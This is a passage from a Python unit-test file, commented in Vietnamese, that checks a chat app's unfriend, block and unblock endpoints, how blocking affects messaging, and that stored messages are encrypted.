        res_unf = self.client.post("/api/friends/unfriend", headers=self.hdra,
                                   json={"friend_id": 2})
        self.assertEqual(res_unf.status_code, 200)
        self.assertTrue(res_unf.json["success"])
        print("   ✅ A hủy kết bạn B thành công")

        # 3. Xác nhận B đã biến khỏi danh sách bạn bè của A
        res_list2 = self.client.get("/api/friends/list", headers=self.hdra)
        friends_after = [f["id"] for f in res_list2.json.get("friends", [])]
        self.assertNotIn(2, friends_after)
        print("   ✅ B không còn trong danh sách bạn bè của A")

        # 4. Hủy lần nữa → phải báo lỗi 404
        res_unf2 = self.client.post("/api/friends/unfriend", headers=self.hdra,
                                    json={"friend_id": 2})
        self.assertEqual(res_unf2.status_code, 404)
        print("   ✅ Hủy kết bạn khi không có quan hệ → 404")

        # 5. Sau unfriend, A vẫn có thể nhắn tin cho B (unfriend ≠ block)
        res_msg = self.client.post("/api/messages/send", headers=self.hdra,
                                   json={"receiver_id": 2, "message": "Dù không còn bạn, vẫn gửi tin được nhé!"})
        self.assertEqual(res_msg.status_code, 200)
        print("   ✅ Sau unfriend, A vẫn nhắn tin được cho B (không bị block)")

        # 6. B cũng nhắn tin ngược lại được
        res_msg_b = self.client.post("/api/messages/send", headers=self.hdrb,
                                     json={"receiver_id": 1, "message": "OK bạn ơi!"})
        self.assertEqual(res_msg_b.status_code, 200)
        print("   ✅ B vẫn nhắn lại được cho A")

    # ----------------------------------------------------------
    # TEST 6: Block user — Ngăn nhắn tin hoàn toàn
    # ----------------------------------------------------------
    def test_06_block_user_prevents_messaging(self):
        """A chặn C → C không thể nhắn tin cho A → A cũng không nhắn được cho C (đang chặn)."""
        print("\n🚫 [TEST] Chặn người dùng (block)...")

        # 1. Xác nhận A và C đang là bạn
        res = self.client.get("/api/friends/list", headers=self.hdra)
        self.assertIn(3, [f["id"] for f in res.json.get("friends", [])])
        print("   ✅ Trước block: A và C là bạn")

        # 2. A chặn C
        res_block = self.client.post("/api/friends/block", headers=self.hdra,
                                     json={"user_id": 3})
        self.assertEqual(res_block.status_code, 200)
        self.assertTrue(res_block.json["success"])
        print("   ✅ A chặn C thành công")

        # 3. Chặn lần nữa → phải báo lỗi 400 (đã chặn rồi)
        res_block2 = self.client.post("/api/friends/block", headers=self.hdra,
                                      json={"user_id": 3})
        self.assertEqual(res_block2.status_code, 400)
        print("   ✅ Chặn trùng → 400")

        # 4. Không thể tự chặn mình → 400
        res_self = self.client.post("/api/friends/block", headers=self.hdra,
                                    json={"user_id": 1})
        self.assertEqual(res_self.status_code, 400)
        print("   ✅ Không thể tự chặn chính mình → 400")

        # 5. C bị chặn bởi A → C gửi tin cho A phải bị chặn 403
        res_c_to_a = self.client.post("/api/messages/send", headers=self.hdrc,
                                      json={"receiver_id": 1, "message": "A ơi, nghe ta nói!"})
        self.assertEqual(res_c_to_a.status_code, 403)
        print("   ✅ C bị chặn → gửi tin cho A → 403 Forbidden")

        # 6. A đang chặn C → A cũng không gửi được cho C → 403
        res_a_to_c = self.client.post("/api/messages/send", headers=self.hdra,
                                      json={"receiver_id": 3, "message": "Ta đang chặn ngươi!"})
        self.assertEqual(res_a_to_c.status_code, 403)
        print("   ✅ A đang chặn C → A gửi cho C → 403 Forbidden")

        # 7. C không còn trong danh sách bạn bè của A (block xóa quan hệ bạn bè)
        res_list = self.client.get("/api/friends/list", headers=self.hdra)
        friend_ids = [f["id"] for f in res_list.json.get("friends", [])]
        self.assertNotIn(3, friend_ids)
        print("   ✅ Sau block: C không còn trong danh sách bạn bè của A")

        # 8. Kiểm tra danh sách blocked của A chứa C
        res_blocked = self.client.get("/api/friends/blocked-list", headers=self.hdra)
        self.assertEqual(res_blocked.status_code, 200)
        blocked_ids = [u["id"] for u in res_blocked.json.get("blocked_users", [])]
        self.assertIn(3, blocked_ids)
        print("   ✅ Danh sách blocked của A chứa C")

        # 9. D không bị chặn → A vẫn nhắn được cho D bình thường
        res_a_to_d = self.client.post("/api/messages/send", headers=self.hdra,
                                      json={"receiver_id": 4, "message": "D ơi chào!"})
        self.assertEqual(res_a_to_d.status_code, 200)
        print("   ✅ A nhắn tin cho D (không bị block) → thành công")

    # ----------------------------------------------------------
    # TEST 7: Bỏ chặn & khôi phục nhắn tin
    # ----------------------------------------------------------
    def test_07_unblock_restores_messaging(self):
        """A bỏ chặn C → C có thể nhắn tin cho A bình thường."""
        print("\n✅ [TEST] Bỏ chặn (unblock) & khôi phục nhắn tin...")

        # 1. Bỏ chặn user chưa bị chặn → 404
        res_fail = self.client.post("/api/friends/unblock", headers=self.hdra,
                                    json={"user_id": 4})
        self.assertEqual(res_fail.status_code, 404)
        print("   ✅ Bỏ chặn user chưa bị chặn → 404")

        # 2. A bỏ chặn C (C đang bị chặn từ test_06)
        res_unblock = self.client.post("/api/friends/unblock", headers=self.hdra,
                                       json={"user_id": 3})
        self.assertEqual(res_unblock.status_code, 200)
        self.assertTrue(res_unblock.json["success"])
        print("   ✅ A bỏ chặn C thành công")

        # 3. Danh sách blocked của A không còn C
        res_blocked = self.client.get("/api/friends/blocked-list", headers=self.hdra)
        blocked_ids = [u["id"] for u in res_blocked.json.get("blocked_users", [])]
        self.assertNotIn(3, blocked_ids)
        print("   ✅ Danh sách blocked của A không còn C")

        # 4. C có thể nhắn tin cho A bình thường sau khi bỏ chặn
        res_c_msg = self.client.post("/api/messages/send", headers=self.hdrc,
                                     json={"receiver_id": 1, "message": "Cảm ơn đã bỏ chặn ta!"})
        self.assertEqual(res_c_msg.status_code, 200)
        print("   ✅ Sau unblock: C nhắn tin cho A thành công")

        # 5. A cũng gửi được cho C
        res_a_msg = self.client.post("/api/messages/send", headers=self.hdra,
                                     json={"receiver_id": 3, "message": "Thôi bỏ qua nhé!"})
        self.assertEqual(res_a_msg.status_code, 200)
        print("   ✅ Sau unblock: A nhắn tin cho C thành công")

        # 6. Xác nhận tin nhắn được mã hóa trong DB (không clear-text)
        conn = get_user_db_conn()
        rows = conn.execute(
            "SELECT message FROM direct_messages WHERE sender_id = 3 AND receiver_id = 1"
        ).fetchall()
        conn.close()
        self.assertTrue(len(rows) > 0)
        for row in rows:
            self.assertTrue(row["message"].startswith("gAAAAA"),
                            f"Tin nhắn không được mã hóa: {row['message'][:30]}")
        print(f"   ✅ {len(rows)} tin nhắn của C→A trong DB đều được mã hóa AES (Fernet)")

        # 7. Lịch sử chat A-C qua API trả về nội dung giải mã chính xác
        res_hist = self.client.get("/api/messages/chat/3", headers=self.hdra)
        self.assertEqual(res_hist.status_code, 200)
        msgs = res_hist.json.get("messages", [])
        decrypted_texts = [m["message"] for m in msgs]
        self.assertIn("Cảm ơn đã bỏ chặn ta!", decrypted_texts)
        self.assertIn("Thôi bỏ qua nhé!", decrypted_texts)
        print("   ✅ API lịch sử chat giải mã chuẩn xác tất cả tin nhắn")


if __name__ == "__main__":
    unittest.main()
